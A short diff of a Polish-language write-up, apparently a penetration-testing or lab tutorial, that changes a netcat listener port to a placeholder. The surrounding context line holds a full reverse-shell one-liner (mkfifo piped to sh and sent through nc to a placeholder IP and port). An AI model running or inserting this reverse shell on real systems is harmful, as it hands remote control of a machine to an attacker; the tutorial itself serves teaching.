@@ -177,7 +177,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [IP] [Port] >/tmp/f
 ```
 Następnie słuchamy połączeń za pomocą narzędzia netcat:
 ```
-nc -lvnp 4444
+nc -lvnp [Port]
 ```
 
 ![RevShell](img/RevShell.JPG)
